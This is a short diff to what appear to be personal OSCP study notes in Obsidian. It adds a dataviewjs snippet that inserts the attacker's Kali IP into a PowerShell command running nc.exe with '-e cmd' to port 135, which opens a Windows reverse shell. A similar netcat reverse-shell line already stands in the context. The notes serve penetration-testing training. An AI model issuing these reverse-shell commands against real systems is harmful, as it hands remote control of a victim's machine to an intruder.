@@ -101,4 +101,13 @@ const command = `.\\nc.exe -nv ${KaliIP} 135 -e cmd`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+OR
 
+Powershell
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `powershell -c "C:/Windows/Temp/nc.exe -nv ${KaliIP} 135 -e cmd`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
